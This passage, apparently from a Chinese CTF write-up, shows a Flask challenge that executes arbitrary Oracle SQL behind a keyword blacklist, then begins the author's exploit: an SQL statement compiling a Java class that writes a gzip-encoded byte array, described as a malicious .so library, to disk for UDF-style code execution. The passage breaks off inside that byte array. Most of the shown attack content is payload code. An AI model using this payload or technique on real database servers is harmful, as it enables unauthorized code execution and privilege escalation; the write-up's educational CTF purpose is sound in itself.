socket</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">username = <span class="string">&quot;system&quot;</span></span><br><span class="line">password = <span class="string">&quot;PaAasSSsSwoRrRDd&quot;</span></span><br><span class="line">ol_server = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">ol_port = <span class="number">1521</span></span><br><span class="line">sid = <span class="string">&quot;orcl&quot;</span></span><br><span class="line">dsn = <span class="string">&quot;&#123;&#125;:&#123;&#125;/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(ol_server, ol_port, sid)</span><br><span class="line">logging.basicConfig(level=logging.INFO, filename=<span class="string">&#x27;/var/log/web.log&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">sql</span>):</span><br><span class="line">    blacklist = [<span class="string">&quot;select&quot;</span>, <span class="string">&quot;insert&quot;</span>, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;table&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;alert&quot;</span>, <span class="string">&quot;procedure&quot;</span>, <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;open&quot;</span>, <span class="string">&quot;:=&quot;</span>, <span class="string">&quot;declare&quot;</span>, <span class="string">&quot;runtime&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;newinstance&quot;</span>, <span class="string">&quot;parse&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;.class&quot;</span>, <span class="string">&quot;loader&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&quot;xml&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;field&quot;</span>, <span class="string">&quot;reflect&quot;</span>, <span class="string">&quot;defineclass&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;getclass&quot;</span>, <span class="string">&quot;forname&quot;</span>, <span class="string">&quot;constructor&quot;</span>, <span class="string">&quot;transform&quot;</span>, <span class="string">&quot;sql&quot;</span>, <span class="string">&quot;beans&quot;</span>, <span class="string">&quot;.net&quot;</span>, <span class="string">&quot;http&quot;</span>, <span class="string">&quot;.rmi&quot;</span>, <span class="string">&quot;naming&quot;</span></span><br><span class="line">                 ]</span><br><span class="line">    sql = sql.lower()</span><br><span class="line">    <span class="keyword">for</span> blackword <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> blackword <span class="keyword">in</span> sql:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">ip, sql, error=<span class="literal">None</span></span>):</span><br><span class="line">    error_text = <span class="string">&quot;-----------------------&#123;&#125;-----------------------\n&quot;</span>.<span class="built_in">format</span>(ip)</span><br><span class="line">    error_text += <span class="string">&quot;sql: &#123;&#125; \n&quot;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">    <span class="keyword">if</span> error != <span class="literal">None</span>:</span><br><span class="line">        error_text += <span class="string">&quot;error: &#123;&#125; \n&quot;</span>.<span class="built_in">format</span>(error)</span><br><span class="line">    error_text += <span class="string">&quot;-------------------------------------------------&quot;</span></span><br><span class="line">    logging.error(error_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/query&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>():</span><br><span class="line">    sql = request.form[<span class="string">&quot;sql&quot;</span>]</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> check(sql):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = oracledb.connect(user=username, password=password, dsn=dsn)</span><br><span class="line">            conn.callTimeout = <span class="number">5000</span></span><br><span class="line">            cursor = conn.cursor()</span><br><span class="line">            cursor.execute(sql)</span><br><span class="line">            cursor.close()</span><br><span class="line">            conn.close()</span><br><span class="line">            log(ip, sql)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log(ip, sql, e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;query success&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>题目就是这样，一个oracle注入，做了一些过滤，然后是任意sql语句执行。然后这一题首先我们是不可以使用任何Java代码中的RCE函数。首先oralce内置的jdk好像是1.6，其次题目waf中过滤了所有命令执行函数，因此是行不通的（System.load确实也不可以)<br>那么这一题的思路其实就回到了之前讲到的lib 加载了，和mysql的udf提权有点类似，写一个恶意so进去，然后给他注册了。<br>首先创建Java Source，创建起来，可以看到后台是创建成功了的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sql=create <span class="keyword">or</span> replace <span class="keyword">and</span> compile java source named <span class="string">&quot;JavaTool&quot;</span> <span class="keyword">as</span></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.util.zip.GZIPInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaTool</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> String <span class="title function_ invoke__">write</span>(String path) throws <span class="built_in">Exception</span> &#123;</span><br><span class="line">        byte[] data = <span class="keyword">new</span> byte[]&#123;<span class="number">31</span>, -<span class="number">117</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">19</span>, <span class="number">91</span>, <span class="number">93</span>, <span class="number">108</span>, <span class="number">20</span>, <span class="number">85</span>, <span class="number">20</span>, -<span class="number">66</span>, -<span class="number">77</span>, <span class="number">109</span>, -<span class="number">23</span>, <span class="number">46</span>, -<span class="number">108</span>, -<span class="number">18</span>, -<span class="number">126</span>, <span class="number">32</span>, -<span class="number">40</span>, -<span class="number">94</span>, <span class="number">93</span>, <span class="number">12</span>, <span class="number">24</span>, <span class="number">80</span>, <span class="number">58</span>, -<span class="number">108</span>, <span class="number">74</span>, <span class="number">17</span>, -<span class="number">123</span>, <span class="number">66</span>, -<span class="number">37</span>, -<span class="number">19</span>, -<span class="number">74</span>, -<span class="number">125</span>, <span class="number">105</span>, <span class="number">11</span>, -<span class="number">42</span>, -<span class="number">10</span>, -<span class="number">127</span>, <span class="number">4</span>, <span class="number">25</span>, -<span class="number">90</span>, <span class="number">59</span>, -<span class="number">45</span>, <span class="number">118</span>, <span class="number">113</span>, <span class="number">127</span>, -<span class="number">56</span>, -<span class="number">18</span>, -<span class="number">76</span>, -<span class="number">76</span>, <span class="number">13</span>, <span class="number">106</span>, -<span class="number">123</span>, -<span class="number">88</span>, <span class="number">52</span>, -<span class="number">124</span>, -<span class="number">124</span>, -<span class="number">60</span>, -<span class="number">104</span>, <span class="number">24</span>, <span class="number">72</span>, <span class="number">12</span>, <span class="number">15</span>, -<span class="number">58</span>, -<span class="number">97</span>, -<span class="number">60</span>, -<span class="number">8</span>, -<span class="number">128</span>, <span class="number">47</span>, -<span class="number">6</span>, <span class="number">100</span>, <span class="number">73</span>, <span class="number">21</span>, -<span class="number">15</span>, -<span class="number">25</span>, <span class="number">1</span>, <span class="number">19</span>, <span class="number">77</span>, <span class="number">26</span>, -<span class="number">115</span>, <span class="number">73</span>, <span class="number">19</span>, <span class="number">67</span>, <span class="number">44</span>, -<span class="number">119</span>, <span class="number">81</span>, -<span class="number">120</span>, -<span class="number">47</span>, <span class="number">84</span>, <span class="number">19</span>, -<span class="number">69</span>, -<span class="number">34</span>, <span class="number">59</span>, <span class="number">115</span>, -<span class="number">50</span>, <span class="number">118</span>, -<span class="number">26</span>, <span class="number">50</span>, <span class="number">35</span>, -<span class="number">8</span>, -<span class="number">128</span>, -<span class="number">119</span>, -<span class="number">15</span>, <span class="number">126</span>, -<span class="number">55</span>, -<span class="number">52</span>, <span class="number">55</span>, -<span class="number">25</span>, -<span class="number">36</span>, -<span class="number">5</span>, -<span class="number">35</span>, -<span class="number">65</span>, -<span class="number">103</span>, <span class="number">114</span>, <span class="number">103</span>, -<span class="number">40</span>, <span class="number">115</span>, -<span class="number">98</span>, -<span class="number">117</span>, <span class="number">119</span>, -<span class="number">76</span>, <span class="number">5</span>, <span class="number">36</span>, -<span class="number">119</span>, <span class="number">32</span>, <span class="number">74</span>, -<span class="number">56</span>, <span class="number">46</span>, -<span class="number">78</span>, <span class="number">96</span>, <span class="number">17</span>, -<span class="number">46</span>, <span class="number">4</span>, <span class="number">28</span>, <span class="number">105</span>, <span class="number">112</span>, -<span class="number">6</span>, -<span class="number">74</span>, -<span class="number">109</span>, <span class="number">16</span>, <span class="number">61</span>, -<span class="number">81</span>, <span class="number">33</span>, -<span class="number">43</span>, <span class="number">86</span>, -<span class="number">35</span>, <span class="number">82</span>, -<span class="number">30</span>, -<span class="number">113</span>, <span class="number">87</span>, <span class="number">75</span>, -<span class="number">35</span>, <span class="number">76</span>, <span class="number">34</span>, <span class="number">54</span>, <span class="number">49</span>, <span class="number">93</span>, -<span class="number">103</span>, -<span class="number">61</span>, -<span class="number">26</span>, -<span class="number">71</span>, <span class="number">65</span>, <span class="number">114</span>, -<span class="number">77</span>, <span class="number">83</span>, <span class="number">103</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">5</span>, <span class="number">63</span>, -<span class="number">57</span>, -<span class="number">81</span>, <span class="number">19</span>, <span class="number">55</span>, <span class="number">59</span>, <span class="number">117</span>, -<span class="number">117</span>, -<span class="number">24</span>, <span class="number">49</span>, <span class="number">87</span>, <span class="number">107</span>, -<span class="number">37</span>, <span class="number">115</span>, -<span class="number">115</span>, <span class="number">110</span>, <span class="number">94</span>, <span class="number">29</span>, -<span class="number">128</span>, <span class="number">102</span>, <span class="number">2</span>, <span class="number">110</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">116</span>, <span class="number">65</span>, -<span class="number">39</span>, -<span class="number">74</span>, -<span class="number">125</span>, -<span class="number">69</span>, -<span class="number">36</span>, <span class="number">60</span>, <span class="number">41</span>, -<span class="number">71</span>, <span class="number">57</span>, <span class="number">8</span>, -<span class="number">14</span>, <span class="number">82</span>, <span class="number">56</span>, -<span class="number">74</span>, <span class="number">67</span>, <span class="number">123</span>, <span class="number">60</span>, -<span class="number">81</span>, <span class="number">35</span>, <span class="number">110</span>, -<span class="number">58</span>, -<span class="number">27</span>, -<span class="number">39</span>, <span class="number">119</span>, -<span class="number">43</span>, -<span class="number">44</span>, <span class="number">45</span>, <span class="number">45</span>, -<span class="number">52</span>, -<span class="number">121</span>, <span class="number">103</span>, <span class="number">63</span>, -<span class="number">35</span>, <span class="number">19</span>, <span class="number">84</span>, -<span class="number">73</span>, -<span class="number">120</span>, -<span class="number">36</span>, <span class="number">62</span>, <span class="number">112</span>, -<span class="number">71</span>, -<span class="number">69</span>, -<span class="number">95</span>, <span class="number">63</span>, -<span class="number">65</span>, <span class="number">117</span>, <span class="number">9</span>, <span class="number">6</span>, -<span class="number">36</span>, -<span class="number">116</span>, -<span class="number">73</span>, -<span class="number">125</span>, <span class="number">105</span>, <span class="number">86</span>, <span class="number">16</span>, -<span class="number">10</span>, -<span class="number">68</span>, <span class="number">16</span>, -<span class="number">46</span>, -<span class="number">34</span>, -<span class="number">43</span>, <span class="number">75</span>, -<span class="number">50</span>, <span class="number">79</span>, -<span class="number">67</span>, <span class="number">123</span>, -<span class="number">19</span>, -<span class="number">36</span>, -<span class="number">15</span>, <span class="number">49</span>, -<span class="number">93</span>, -<span class="number">4</span>, -<span class="number">21</span>, -<span class="number">122</span>, <span class="number">29</span>, <span class="number">114</span>, -<span class="number">29</span>, -<span class="number">101</span>, -<span class="number">83</span>, <span class="number">103</span>, <span class="number">107</span>, -<span class="number">109</span>, <span class="number">7</span>, <span class="number">89</span>, <span class="number">61</span>, <span class="number">92</span>, <span class="number">63</span>, <span class="number">92</span>, <span class="number">127</span>, <span class="number">112</span>, <span class="number">89</span>, -<span class="number">83</span>, <span class="number">49</span>, <span class="number">123</span>, -<span class="number">76</span>, -<span class="number">1</span>, -<span class="number">28</span>, -<span class="number">110</span>, <span class="number">91</span>, -<span class="number">115</span>, <span class="number">51</span>, -<span class="number">22</span>, -<span class="number">31</span>, -<span class="number">33</span>, <span class="number">79</span>, -<span class="number">113</span>, -<span class="number">27</span>, <span class="number">30</span>, <span class="number">126</span>, -<span class="number">55</span>, -<span class="number">89</span>, -<span class="number">2</span>, <span class="number">38</span>, <span class="number">31</span>, <span class="number">127</span>, <span class="number">27</span>, <span class="number">61</span>, -<span class="number">18</span>, -<span class="number">9</span>, -<span class="number">16</span>, -<span class="number">9</span>, <span class="number">90</span>, -<span class="number">19</span>, <span class="number">87</span>, -<span class="number">112</span>, -<span class="number">48</span>, <span class="number">50</span>, -<span class="number">37</span>, <span class="number">94</span>, -<span class="number">117</span>, <span class="number">5</span>, -<span class="number">86</span>, <span class="number">58</span>, -<span class="number">112</span>, -<span class="number">50</span>, <span class="number">102</span>, -<span class="number">44</span>, -<span class="number">68</span>, -<span class="number">87</span>, -<span class="number">27</span>, <span class="number">76</span>, <span class="number">85</span>, <span class="number">37</span>, -<span class="number">22</span>, -<span class="number">98</span>, -<span class="number">98</span>, <span class="number">78</span>, <span class="number">85</span>, <span class="number">55</span>, <span class="number">114</span>, -<span class="number">58</span>, <span class="number">64</span>, <span class="number">50</span>, <span class="number">111</span>, <span class="number">26</span>, -<span class="number">71</span>, -<span class="number">98</span>, -<span class="number">50</span>, <span class="number">88</span>, <span class="number">42</span>, -<span class="number">101</span>, <span class="number">49</span>, <span class="number">122</span>, -<span class="number">76</span>, -<span class="number">66</span>, -<span class="number">108</span>, <span class="number">97</span>, -<span class="number">105</span>, <span class="number">121</span>, -<span class="number">105</span>, -<span class="number">88</span>, -<span class="number">119</span>, <span class="number">17</span>, <span class="number">77</span>, -<span class="number">19</span>, <span class="number">79</span>, <span class="number">102</span>, -<span class="number">76</span>, <span class="number">84</span>, <span class="number">114</span>, -<span class="number">52</span>, <span class="number">32</span>, -<span class="number">119</span>, -<span class="number">76</span>, <span class="number">78</span>, -<span class="number">14</span>, -<span class="number">93</span>, -<span class="number">76</span>, <span class="number">86</span>, -<span class="number">102</span>, -<span class="number">92</span>, -<span class="number">110</span>, <span class="number">125</span>, <span class="number">9</span>, <span class="number">57</span>, -<span class="number">97</span>, -<span class="number">107</span>, -<span class="number">73</span>, -<span class="number">111</span>, -<span class="number">10</span>, -<span class="number">114</span>, <span class="number">61</span>, <span class="number">45</span>, <span class="number">49</span>, -<span class="number">75</span>, <span class="number">94</span>, -<span class="number">82</span>, -<span class="number">105</span>, <span class="number">27</span>, -<span class="number">84</span>, <span class="number">121</span>, <span class="number">5</span>, -<span class="number">24</span>, <span class="number">97</span>, -<span class="number">97</span>, -<span class="number">19</span>, <span class="number">121</span>, <span class="number">74</span>, -<span class="number">28</span>, <span class="number">16</span>, <span class="number">89</span>, -<span class="number">72</span>, -<span class="number">113</span>, <span class="number">67</span>, <span class="number">85</span>, -<span class="number">55</span>, <span class="number">16</span>, <span class="number">91</span>, -<span class="number">42</span>, -<span class="number">61</span>, <span class="number">96</span>, <span class="number">23</span>, -<span class="number">17</span>, <span class="number">31</span>, -<span class="number">114</span>, <span class="number">27</span>, -<span class="number">26</span>, <span class="number">65</span>, <span class="number">118</span>, -<span class="number">71</span>, -<span class="number">3</span>, -<span class="number">109</span>, -<span class="number">48</span>, <span class="number">64</span>, -<span class="number">80</span>, -<span class="number">55</span>, -<span class="number">19</span>, <span class="number">71</span>, -<span class="number">5</span>, -<span class="number">14</span>, <span class="number">110</span>, -<span class="number">101</span>, -<span class="number">15</span>, <span class="number">30</span>, <span class="number">34</span>, -<span class="number">82</span>, <span class="number">56</span>, -<span class="number">4</span>, <span class="number">37</span>, <span class="number">14</span>, -<span class="number">1</span>, -<span class="number">76</span>, -<span class="number">61</span>, -<span class="number">17</span>, -<span class="number">4</span>, <span class="number">119</span>, <span class="number">97</span>, -<span class="number">58</span>, -<span class="number">31</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">52</span>, -<span class="number">12</span>, <span class="number">83</span>, <span class="number">78</span>, -<span class="number">32</span>, -<span class="number">95</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, -<span class="number">72</span>, <span class="number">99</span>, <span class="number">80</span>, <span class="number">78</span>, -<span class="number">4</span>, <span class="number">24</span>, <span class="number">84</span>, <span class="number">78</span>, -<span class="number">107</span>, <span class="number">125</span>, -<span class="number">68</span>, -<span class="number">103</span>, <span class="number">94</span>, -<span class="number">66</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">87</span>, -<span class="number">108</span>, <span class="number">19</span>, <span class="number">31</span>, <span class="number">5</span>, -<span class="number">89</span>, -<span class="number">118</span>, -<span class="number">27</span>, -<span class="number">123</span>, -<span class="number">122</span>, -<span class="number">49</span>, <span class="number">104</span>, <span class="number">81</span>, <span class="number">97</span>, -<span class="number">3</span>, <span class="number">23</span>, -<span class="number">12</span>, <span class="number">28</span>, -<span class="number">82</span>, <span class="number">105</span>, -<span class="number">94</span>, <span class="number">87</span>, -<span class="number">52</span>, <span class="number">30</span>, <span class="number">100</span>, <span class="number">69</span>, -<span class="number">41</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">20</span>, -<span class="number">21</span>, -<span class="number">49</span>, <span class="number">82</span>, -<span class="number">69</span>, -<span class="number">1</span>, <span class="number">76</span>, -<span class="number">79</span>, -<span class="number">67</span>, -<span class="number">45</span>, -<span class="number">115</span>, <span class="number">31</span>, -<span class="number">80</span>, -<span class="number">74</span>, <span class="number">78</span>, -<span class="number">105</span>, <span class="number">93</span>, <span class="number">96</span>, -<span class="number">12</span>, -<span class="number">24</span>, -<span class="number">100</span>, -<span class="number">71</span>, -<span class="number">110</span>, <span class="number">54</span>, <span class="number">127</span>, <span class="number">16</span>, -<span class="number">102</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">102</span>, -<span class="number">62</span>, <span class="number">53</span>, -<span class="number">29</span>, -<span class="number">84</span>, -<span class="number">34</span>, <span class="number">20</span>, <span class="number">48</span>, -<span class="number">83</span>, <span class="number">63</span>, <span class="number">97</span>, -<span class="number">43</span>, <span class="number">111</span>, <span class="number">56</span>, -<span class="number">50</span>, <span class="number">104</span>, -<span class="number">29</span>, -<span class="number">68</span>, <span class="number">50</span>, <span class="number">113</span>, <span class="number">93</span>, -<span class="number">71</span>, -<span class="number">8</span>, -<span class="number">45</span>, <span class="number">110</span>, -<span class="number">27</span>, -<span class="number">30</span>, <span class="number">92</span>, -<span class="number">119</span>, <span class="number">34</span>, <span class="number">93</span>, <span class="number">82</span>, -<span class="number">66</span>, -<span class="number">100</span>, <span class="number">55</span>, <span class="number">87</span>, -<span class="number">48</span>, <span class="number">6</span>, <span class="number">106</span>, -<span class="number">95</span>, -<span class="number">127</span>, <span class="number">96</span>, <span class="number">97</span>, -<span class="number">90</span>, <span class="number">63</span>, <span class="number">92</span>, -<span class="number">45</span>, -<span class="number">70</span>, -<span class="number">96</span>, -<span class="number">1</span>, <span class="number">37</span>, <span class="number">124</span>, -<span class="number">33</span>, <span class="number">31</span>, -<span class="number">29</span>, -<span class="number">115</span>, <span class="number">113</span>, <span class="number">90</span>, <span class="number">76</span>, -<span class="number">122</span>, <span class="number">30</span>, -<span class="number">22</span>, <span class="number">85</span>, <span class="number">78</span>, <span class="number">52</span>, <span class="number">46</span>, <span class="number">102</span>, -<span class="number">105</span>, -<span class="number">54</span>, -<span class="number">60</span>, <span class="number">85</span>, -<span class="number">77</span>, <span class="number">66</span>, <span class="number">57</span>, -<span class="number">43</span>, -<span class="number">8</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">102</span>, -<span class="number">9</span>, -<span class="number">45</span>, <span class="number">81</span>, -<span class="number">50</span>, -<span class="number">22</span>, -<span class="number">12</span>, <span class="number">116</span>, -<span class="number">87</span>, -<span class="number">20</span>, <span class="number">94</span>, <span class="number">106</span>, <span class="number">75</span>, <span class="number">79</span>, <span class="number">81</span>, -<span class="number">83</span>, <span class="number">75</span>, <span class="number">127</span>, -<span class="number">19</span>, <span class="number">40</span>, <span class="number">45</span>, -<span class="number">20</span>, -<span class="number">91</span>, <span class="number">26</span>, -<span class="number">70</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">101</span>, -<span class="number">30</span>, -<span class="number">103</span>, <span class="number">57</span>, -<span class="number">27</span>, <span class="number">84</span>, <span class="number">124</span>, <span class="number">78</span>, -<span class="number">103</span>, -<span class="number">8</span>, <span class="number">100</span>, <span class="number">54</span>, <span class="number">76</span>, -<span class="number">3</span>, <span class="number">116</span>, <span class="number">38</span>, -<span class="number">45</span>, -<span class="number">107</span>, -<span class="number">124</span>, <span class="number">124</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">107</span>, -<span class="number">27</span>, <span class="number">90</span>, <span class="number">29</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, -<span class="number">127</span>, -<span class="number">1</span>, <span class="number">6</span>, -<span class="number">78</span>, <span class="number">79</span>, -<span class="number">45</span>, <span class="number">47</span>, -<span class="number">30</span>, -<span class="number">22</span>, -<span class="number">110</span>, <span class="number">29</span>, <span class="number">81</span>, <span class="number">98</span>, -<span class="number">1</span>, -<span class="number">114</span>, -<span class="number">73</span>, -<span class="number">26</span>, <span class="number">122</span>, -<span class="number">95</span>, -<span class="number">80</span>, -<span class="number">109</span>, -<span class="number">14</span>, <span class="number">78</span>, -<span class="number">54</span>, <span class="number">58</span>, -<span class="number">27</span>, -<span class="number">78</span>, <span class="number">27</span>, -<span class="number">123</span>, -<span class="number">62</span>, <span class="number">49</span>, <span class="number">98</span>, -<span class="number">1</span>, -<span class="number">42</span>, -<span class="number">53</span>, <span class="number">32</span>, -<span class="number">115</span>, <span class="number">117</span>, <span class="number">19</span>, <span class="number">105</span>, <span class="number">36</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">87</span>, -<span class="number">108</span>, <span class="number">7</span>, -<span class="number">49</span>, <span class="number">72</span>, -<span class="number">10</span>, -<span class="number">17</span>, -<span class="number">48</span>, <span class="number">107</span>, -<span class="number">24</span>, <span class="number">49</span>, -<span class="number">3</span>, <span class="number">115</span>, -<span class="number">95</span>, -<span class="number">64</span>, -<span class="number">38</span>, <span class="number">32</span>, -<span class="number">107</span>, -<span class="number">111</span>, -<span class="number">74</span>, -<span class="number">54</span>, -<span class="number">43</span>, -<span class="number">113</span>, -<span class="number">121</span>, -<span class="number">105</span>, <span class="number">28</span>, <span class="number">13</span>, -<span class="number">114</span>, -<span class="number">109</span>, -<span class="number">35</span>, <span class="number">85</span>, <span class="number">59</span>, <span class="number">30</span>, <span class="number">124</span>, <span class="number">120</span>, -<span class="number">99</span>, -<span class="number">11</span>, -<span class="number">13</span>, <span class="number">42</span>, -<span class="number">45</span>, -<span class="number">45</span>, -<span class="number">49</span>, <span class="number">118</span>, <span class="number">114</span>, -<span class="number">123</span>, -<span class="number">42</span>, <span class="number">11</span>, <span class="number">58</span>, -<span class="number">6</span>, <span class="number">103</span>, -<span class="number">38</span>, <span class="number">3</span>, -<span class="number">12</span>, <span class="number">120</span>, -<span class="number">98</span>, -<span class="number">10</span>, <span class="number">103</span>, -<span class="number">3</span>, -<span class="number">58</span>, -<span class="number">38</span>, <span class="number">92</span>, <span class="number">25</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">16</span>, <span class="number">91</span>, -<span class="number">70</span>, -<span class="number">24</span>, <span class="number">0</span>, -<span class="number">19</span>, -<span class="number">32</span>, -<span class="number">114</span>, -<span class="number">49</span>, <span class="number">94</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, -<span class="number">32</span>, <span class="number">127</span>, <span class="number">0</span>, -<span class="number">120</span>, <span class="number">7</span>, -<span class="number">99</span>, <span class="number">116</span>, -<span class="number">60</span>, <span class="number">71</span>, <span class="number">51</span>, <span class="number">28</span>, <span class="number">2</span>, -<span class="number">82</span>, -<span class="number">64</span>, <span class="number">122</span>, <span class="number">80</span>, -<span class="number">66</span>, <span class="number">20</span>, -<span class="number">52</span>, <span class="number">77</span>, -<span class="number">96</span>, -<span class="number">69</span>, <span class="number">7</span>, <span class="number">108</span>, -<span class="number">116</span>, <span class="number">51</span>, -<span class="number">83</span>, <span class="number">6</span>, <span class="number">27</span>, -<span class="number">65</span>, -<span class="number">39</span>, -<span class="number">86</span>, <span class="number">80</span>, <span class="number">15</span>, -<span class="number">15</span>, -<span class="number">90</span>, <span class="number">107</span>, -<span class="number">72</span>, -<span class="number">14</span>, <span class="number">95</span>, -<span class="number">25</span>, <span class="number">11</span>, <span class="number">89</span>, -<span class="number">85</span>, <span class="number">63</span>, <span class="number">8</span>, -<span class="number">6</span>, -<span class="number">60</span>, -<span class="number">104</span>, -<span class="number">48</span>, <span class="number">58</span>, <span class="number">8</span>, <span class="number">38</span>, -<span class="number">59</span>, <span class="number">88</span>, -<span class="number">26</span>, -<span class="number">109</span>, <span class="number">80</span>, -<span class="number">66</span>, <span class="number">24</span>, -<span class="number">20</span>, <span class="number">97</span>, <span class="number">96</span>, <span class="number">12</span>, <span class="number">26</span>, <span class="number">94</span>, <span class="number">13</span>, -<span class="number">116</span>, <span class="number">49</span>, -<span class="number">88</span>, -<span class="number">77</span>, <span class="number">16</span>, <span class="number">103</span>, <span class="number">26</span>, -<span class="number">32</span>, -<span class="number">54</span>, -<span class="number">15</span>, -<span class="number">5</span>, -<span class="number">75</span>, <span class="number">28</span>, <span class="number">120</span>, <span class="number">21</span>, -<span class="number">16</span>, <span class="number">120</span>, -<span class="number">87</span>, -<span class="number">37</span>, <span class="number">63</span>, <span class="number">93</span>, -<span class="number">30</span>, <span class="number">30</span>, -<span class="number">25</span>, <span class="number">91</span>, -<span class="number">64</span>, <span class="number">33</span>, -<span class="number">82</span>, -<span class="number">67</span>, -<span class="number">7</span>, -<span class="number">126</span>, <span class="number">61</span>, -<span class="number">2</span>, -<span class="number">9</span>, -<span class="number">95</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">108</span>, <span class="number">92</span>, -<span class="number">57</span>, -<span class="number">21</span>, <span class="number">96</span>, -<span class="number">65</span>, <span class="number">1</span>, -<span class="number">27</span>, -<span class="number">65</span>, -<span class="number">125</span>, -<span class="number">19</span>, -<span class="number">116</span>, -<span class="number">107</span>, -<span class="number">3</span>, <span class="number">55</span>, -<span class="number">127</span>, -<span class="number">15</span>, -<span class="number">22</span>, <span class="number">60</span>, -<span class="number">74</span>, <span class="number">113</span>, -<span class="number">15</span>, -<span class="number">65</span>, -<span class="number">19</span>, -<span class="number">79</span>, -<span class="number">40</span>, <span class="number">99</span>, -<span class="number">47</span>, <span class="number">13</span>, -<span class="number">83</span>, <span class="number">70</span>, <span class="number">95</span>, <span class="number">82</span>, -<span class="number">53</span>, <span class="number">68</span>, -<span class="number">73</span>, -<span class="number">80</span>, -<span class="number">24</span>, -<span class="number">29</span>, -<span class="number">70</span>, -<span class="number">38</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">55</span>, -<span class="number">62</span>, -<span class="number">91</span>, <span class="number">127</span>, -<span class="number">5</span>, <span class="number">118</span>, <span class="number">92</span>, -<span class="number">2</span>, -<span class="number">115</span>, <span class="number">2</span>, -<span class="number">17</span>, <span class="number">103</span>, -<span class="number">49</span>, <span class="number">81</span>, -<span class="number">128</span>, -<span class="number">98</span>, -<span class="number">9</span>, <span class="number">69</span>, -<span class="number">36</span>, -<span class="number">2</span>, <span class="number">74</span>, -<span class="number">16</span>, -<span class="number">113</span>, <span 